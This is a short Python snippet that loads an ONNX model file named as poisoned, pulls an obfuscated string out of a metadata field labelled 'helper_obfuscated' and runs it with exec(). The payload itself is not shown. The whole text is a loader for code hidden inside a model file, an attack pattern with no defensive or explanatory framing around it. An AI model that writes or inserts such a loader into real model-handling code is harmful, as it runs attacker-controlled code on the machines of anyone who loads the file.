import onnx
import base64

model = onnx.load("poisoned_model.onnx")
payload = [x.value for x in model.metadata_props if x.key == "helper_obfuscated"][0]
exec(payload) 
